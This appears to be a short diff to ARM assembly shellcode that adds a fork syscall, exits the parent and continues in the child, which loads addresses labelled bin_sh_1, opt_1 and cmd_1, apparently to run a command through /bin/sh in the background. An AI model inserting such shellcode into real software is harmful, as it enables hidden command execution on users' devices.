@@ -1,5 +1,16 @@
 .globl _start
-_start:   
+_start:
+    # fork
+    MOV             R7, #2
+    SVC             0 
+    CMP             R0, #0
+    BEQ             _child
+    # exit parent
+    MOV             R0, #0
+    MOV             R7, #1
+    SVC             0
+
+_child:
     adr r0, bin_sh_1
     adr r5, opt_1
     adr r6, cmd_1
